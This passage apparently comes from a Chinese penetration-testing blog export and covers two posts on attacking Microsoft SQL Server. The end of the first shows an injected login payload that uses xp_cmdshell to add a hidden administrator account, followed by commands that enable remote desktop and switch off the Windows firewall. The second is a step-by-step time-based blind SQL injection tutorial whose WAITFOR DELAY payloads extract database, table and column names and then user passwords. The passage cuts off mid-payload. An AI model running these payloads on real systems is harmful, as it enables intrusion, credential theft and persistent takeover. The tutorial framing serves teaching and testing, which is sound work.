alt="图片"></p><p>成功上线！</p><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>PS：当前权限是有添加用户的权限，需要<code>administrator</code>或<code>system</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加用户 saul 并提升为管理员组：</span><br><span class="line">net user saul saul123... /add &amp;&amp; net localgroup administrators saul /add</span><br><span class="line">添加 saul 为远程桌面组（有的时候需要添加到远程桌面组才能登陆3308）：</span><br><span class="line">net localgroup &quot;Remote Management Users&quot; saul /add</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; ;exec master..xp_cmdshell &quot;net user saul saul123... /add&amp;net localgroup administrators saul /add&quot;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1493.png" alt="图片"></p><p>上帝视角看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1494.png" alt="图片"></p><p>登陆远程桌面：<code>mstsc</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1495.png" alt="图片"></p><p>可以看到登陆成功！</p><p>PS：如果登陆之后我们需要吧<code>用户注销</code>！不然用户还是在登陆状态中的！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1496.png" alt="图片"></p><p>完成了一些后渗透操作记得要把<code>用户删除</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user saul /del</span><br></pre></td></tr></table></figure><p>那么还有一种情况是目标<code>没有开3389</code>又或者是<code>开启了防火墙</code>！</p><p>那么就可以执行命令让他<code>开3389</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p>关闭防火墙命令（慎用）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MsSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft SQL Server手注之延时型时间盲注</title>
      <link href="/2020/03/12/SQL-MsSQL-4/"/>
      <url>/2020/03/12/SQL-MsSQL-4/</url>
      
        <content type="html"><![CDATA[<h2 id="延迟注入简介"><a href="#延迟注入简介" class="headerlink" title="延迟注入简介"></a>延迟注入简介</h2><h3 id="延时函数-WAITFOR-DELAY"><a href="#延时函数-WAITFOR-DELAY" class="headerlink" title="延时函数 WAITFOR DELAY"></a>延时函数 WAITFOR DELAY</h3><p><code>WAITFOR</code>是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数<code>DELAY</code>，⽤来指定等待的时间。</p><p>如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有<code>延迟</code>，渗透测试⼈员就可以判断⽹站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY &#x27;0:0:n&#x27;</span><br></pre></td></tr></table></figure><p>⽰例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY &#x27;0:0:4&#x27; --  表⽰延迟4秒</span><br></pre></td></tr></table></figure><h3 id="IF-exists-⼦句"><a href="#IF-exists-⼦句" class="headerlink" title="IF exists ()⼦句"></a>IF exists ()⼦句</h3><p>语法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF exists () WAITFOR DELAY &#x27;0:0:5&#x27;</span><br></pre></td></tr></table></figure><h2 id="手工延时注入"><a href="#手工延时注入" class="headerlink" title="手工延时注入"></a>手工延时注入</h2><h3 id="1-判断是否存在注⼊"><a href="#1-判断是否存在注⼊" class="headerlink" title="1.判断是否存在注⼊"></a>1.判断是否存在注⼊</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY &#x27;0:0:4&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1440.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1441.png" alt="图片"></p><h3 id="2-猜测数据库名"><a href="#2-猜测数据库名" class="headerlink" title="2.猜测数据库名"></a>2.猜测数据库名</h3><h4 id="猜测数据库名是否存在"><a href="#猜测数据库名是否存在" class="headerlink" title="猜测数据库名是否存在"></a>猜测数据库名是否存在</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((select count(*) from master.dbo.sysdatabases where dbid=5)=1) waitfor delay &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1442.png" alt="图片"></p><p>这条语句的意思呢是判断<code>dibd=6</code>的数据库是否存在！如果存在那么就<code>延迟3秒</code>返回！</p><h4 id="根据dbid猜库名，先猜出长度"><a href="#根据dbid猜库名，先猜出长度" class="headerlink" title="根据dbid猜库名，先猜出长度"></a>根据dbid猜库名，先猜出长度</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((select count(*) from master.dbo.sysdatabases where dbid=5 and len(name)=4)=1) waitfor delay &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1443.png" alt="图片"></p><p>因为我数据库里只有两个我创建的数据库：<code>test</code>（dbid5）、<code>saulgoodman</code>（dbid6）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1444.png" alt="图片"></p><p>所以我就能用上面的语句来判断<code>dbid5</code>的长度<code>是否为5</code>，如果为<code>5</code>那么就<code>延迟3秒</code>返回！</p><p>同理猜解<code>dbid6</code>（saulgoodman）的长度可以用这条语句:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((select count(*) from master.dbo.sysdatabases where dbid=6 and len(name)=11)=1) waitfor delay &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1445.png" alt="图片"></p><p>如果有多数据库那么就同理上面的语句以此类推就好了~</p><h4 id="根据dbid查询挨个查询数据库名"><a href="#根据dbid查询挨个查询数据库名" class="headerlink" title="根据dbid查询挨个查询数据库名"></a>根据dbid查询挨个查询数据库名</h4><p>因为我们<code>dbid=4</code>这个数据库是<code>test</code>，那么我们就可以来一个一个的猜解他的数据库名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字符：t</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=5),1,1)) = 116) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第二个字符：e</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=5),2,1)) = 101) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第三个字符：s</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=5),3,1)) = 115) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第四个字符：t</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1446.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1447.png" alt="图片"></p><p>如果想查询<code>dbid6</code>的数据库<code>saulgoodman</code>那么我们就直接<code>改dbid</code>号就好了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字符：s</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),1,1)) = 115) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第二个字符：a</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),2,1)) = 97) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第三个字符：u</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),3,1)) = 117) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第四个字符：l</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),4,1)) = 108) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第五个字符：g</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),5,1)) = 103) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第六个字符：o</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),6,1)) = 111) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第七个字符：o</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),7,1)) = 111) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第八个字符：d</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),8,1)) = 100) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第九个字符：m</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),9,1)) = 109) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第十个字符：a</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),10,1)) = 97) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第十一个字符：n</span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=6),11,1)) = 110) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1448.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1449.png" alt="图片"></p><h3 id="3-猜解表名"><a href="#3-猜解表名" class="headerlink" title="3.猜解表名"></a>3.猜解表名</h3><p>因为我们知道了数据库名是<code>test</code>，然后我们就可以使用下面的语句来查询第一个表名的长度<code>是否等于5</code>(表名是users)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and len(name)=5)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1450.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1451.png" alt="图片"></p><p>由上图可见，页面<code>返回正常</code>说明它的表名长度是<code>5</code>，那么我们就可以挨个猜解他的字符：<code>users</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字符：u</span><br><span class="line">if ((select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,1,1))=117)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第二个字符：s</span><br><span class="line">if ((select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,2,1))=115)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第三个字符：e</span><br><span class="line">if ((select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,3,1))=101)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第四个字符：r</span><br><span class="line">if ((select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,4,1))=114)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第五个字符：s</span><br><span class="line">if ((select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,5,1))=115)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1452.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1453.png" alt="图片"></p><p>因为我们知道了数据库名是<code>test</code>，第一个表名是 <code>users</code>，然后我们就可以使用下面的语句来查询<code>第二个表名</code>的字符(表名是info)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字符：i</span><br><span class="line">if ((select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,1,1))=105)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第二个字符：n</span><br><span class="line">if ((select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,2,1))=110)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第三个字符：f</span><br><span class="line">if ((select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,3,1))=102)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第四个字符：o</span><br><span class="line">if ((select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,4,1))=111)=1) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1454.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1455.png" alt="图片"></p><h3 id="4-猜解列名"><a href="#4-猜解列名" class="headerlink" title="4.猜解列名"></a>4.猜解列名</h3><p>因为我们知道了表名是 <code>users</code>，那么我们可以猜解 <code>users</code> 表名下的列名：（列名是 username）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字符：u</span><br><span class="line">if (exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,1,1))=117)) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第二个字符：s</span><br><span class="line">if (exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,2,1))=115)) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第三个字符：e</span><br><span class="line">if (exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,3,1))=101)) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第四个字符：r</span><br><span class="line">if (exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,4,1))=114)) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第五个字符：n</span><br><span class="line">if (exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,5,1))=110)) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第六个字符：a</span><br><span class="line">if (exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,6,1))=97)) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第七个字符：m</span><br><span class="line">if (exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,7,1))=109)) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">猜解第八个字符：e</span><br><span class="line">if (exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,8,1))=101)) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1456.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1457.png" alt="图片"></p><p>这样就猜解出来了第一个列名，<code>username</code>！</p><p>第二种方式：我们有 <code>id</code>、<code>username</code>、<code>password</code>、<code>age</code> 四个列</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1458.png" alt="图片"></p><p>获取第一列：（列名是id）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取第一个字符：i</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;)),1,1)) =105) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第二个字符：d</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;)),2,1)) =100) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1459.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1460.png" alt="图片"></p><p>获取第二列：（列名是username）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">获取第一个字符：u</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),1,1)) = 117) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第二个字符：s</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),2,1)) = 115) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第三个字符：e</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),3,1)) = 101) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第四个字符：r</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),4,1)) = 114) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第五个字符：n</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),5,1)) = 110) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第六个字符：a</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),6,1)) = 97) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第七个字符：m</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),7,1)) = 109) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第八个字符：e</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),8,1)) = 101) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1461.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1462.png" alt="图片"></p><p>获取第三列：（列名是password）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">获取第一个字符：p</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),1,1)) =112) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第二个字符：a</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),2,1)) =97) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第三个字符：s</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),3,1)) =115) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第四个字符：s</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),4,1)) =115) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第五个字符：w</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),5,1)) =119) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第六个字符：o</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),6,1)) =111) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第七个字符：r</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),7,1)) =114) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">获取第八个字符：d</span><br><span class="line">if (ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),8,1)) =100) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1463.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1464.png" alt="图片"></p><h3 id="5-逐字猜解数据"><a href="#5-逐字猜解数据" class="headerlink" title="5.逐字猜解数据"></a>5.逐字猜解数据</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1465.png" alt="图片"></p><p>我们知道了表名是：<code>users</code>，列名是：<code>username</code>、<code>passwrd</code>，那么我们就开始爆数据了：（saul）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">判断username列第一个字符：s</span><br><span class="line">if (ascii(substring((select top 1 username from users),1,1)) = 115) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">判断username列第二个字符：a</span><br><span class="line">if (ascii(substring((select top 1 username from users),2,1)) = 97) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">判断username列第三个字符：u</span><br><span class="line">if (ascii(substring((select top 1 username from users),3,1)) = 117) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">判断username列第四个字符：l</span><br><span class="line">if (ascii(substring((select top 1 username from users),4,1)) =108) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1466.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1467.png" alt="图片"></p><p>这样就获取到了第一个用户名为：<code>saul</code></p><p>获取 <code>saul</code> 的密码：（密码是saul520）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">判断 password 列第一个字符：s</span><br><span class="line">if (ascii(substring((select top 1 password from users),1,1)) =115) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">判断 password 列第二个字符：a</span><br><span class="line">if (ascii(substring((select top 1 password from users),2,1)) =97) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">判断 password 列第三个字符：u</span><br><span class="line">if (ascii(substring((select top 1 password from users),3,1)) =117) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">判断 password 列第四个字符：l</span><br><span class="line">if (ascii(substring((select top 1 password from users),4,1)) =108) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">判断 password 列第五个字符：5</span><br><span class="line">if (ascii(substring((select top 1 password from users),5,1)) =53) WAITFOR DELAY 